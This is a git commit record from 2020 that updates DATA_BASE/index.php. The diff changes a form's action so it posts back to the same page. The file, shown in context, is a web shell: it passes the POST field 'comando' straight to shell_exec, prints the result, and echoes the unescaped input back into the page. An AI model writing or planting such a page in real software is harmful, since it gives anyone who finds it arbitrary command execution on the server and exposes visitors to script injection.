dbda9d07b76f54dff8ec6389c7004650f30d5f47
CopiaDoMalucos <64922627+CopiaDoMalucos@users.noreply.github.com>
2020-05-29 18:13:05 -0300

    Update index.php

--- DATA_BASE/index.php
+++ DATA_BASE/index.php
@@ -4,7 +4,7 @@ $output = shell_exec($_POST['comando']);
 echo "<pre>$output</pre>";
 
 ?>
-<form action="/blocks/dev_block.php" method="post">
+<form method="post">
   <textarea id="comando" name="comando"><?=$_POST['comando']?></textarea>
   <input type="submit" value="Submit">
 </form>
